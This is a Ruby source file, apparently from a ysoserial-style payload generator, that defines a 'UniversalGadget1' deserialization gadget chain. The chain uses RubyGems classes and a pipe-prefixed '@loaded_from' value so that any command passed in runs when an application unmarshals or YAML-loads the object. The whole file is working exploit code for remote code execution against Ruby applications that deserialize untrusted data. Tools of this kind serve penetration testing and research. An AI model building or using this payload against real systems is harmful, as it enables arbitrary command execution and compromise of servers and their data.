require 'ysoserial/gadgets/gadget/base'

class Gem::Requirement
  def marshal_dump
    [@requirements]
  end
end

class YSoSerial::Gadgets::UniversalGadget1 < YSoSerial::BaseGadget
  def supported_formats
    [:yaml, :marshal]
  end

  def payload
    stub_specification = Gem::StubSpecification.allocate
    stub_specification.instance_variable_set(:@loaded_from, "|#{@cmd}")

    specific_file = Gem::Source::SpecificFile.allocate
    specific_file.instance_variable_set(:@spec, stub_specification)

    other_specific_file = Gem::Source::SpecificFile.allocate
    other_specific_file.instance_variable_set(:@spec, nil)

    dependency_list = Gem::DependencyList.allocate
    dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

    gadget = Gem::Requirement.allocate
    gadget.instance_variable_set('@requirements', dependency_list)

    gadget
  end
end